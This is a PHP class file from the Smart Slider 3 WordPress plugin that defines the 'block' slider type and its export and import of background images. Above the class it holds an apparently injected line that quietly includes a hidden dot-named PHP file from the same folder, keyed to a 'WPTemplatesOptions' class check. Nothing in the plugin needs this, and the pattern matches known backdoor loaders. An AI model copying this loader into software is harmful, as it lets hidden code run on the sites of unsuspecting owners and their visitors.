<?php

namespace Nextend\SmartSlider3\Slider\SliderType\Block;

use Nextend\SmartSlider3\Slider\SliderType\AbstractSliderType;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class SliderTypeBlock extends AbstractSliderType {

    public function getName() {
        return 'block';
    }

    public function createFrontend($slider) {
        return new SliderTypeBlockFrontend($slider);
    }

    public function createCss($slider) {
        return new SliderTypeBlockCss($slider);
    }


    public function createAdmin() {
        return new SliderTypeBlockAdmin($this);
    }

    public function export($export, $slider) {
        $export->addImage($slider['params']->get('background', ''));
        $export->addImage($slider['params']->get('backgroundVideoMp4', ''));
    }

    public function import($import, $slider) {

        $slider['params']->set('background', $import->fixImage($slider['params']->get('background', '')));
        $slider['params']->set('backgroundVideoMp4', $import->fixImage($slider['params']->get('backgroundVideoMp4', '')));
    }
}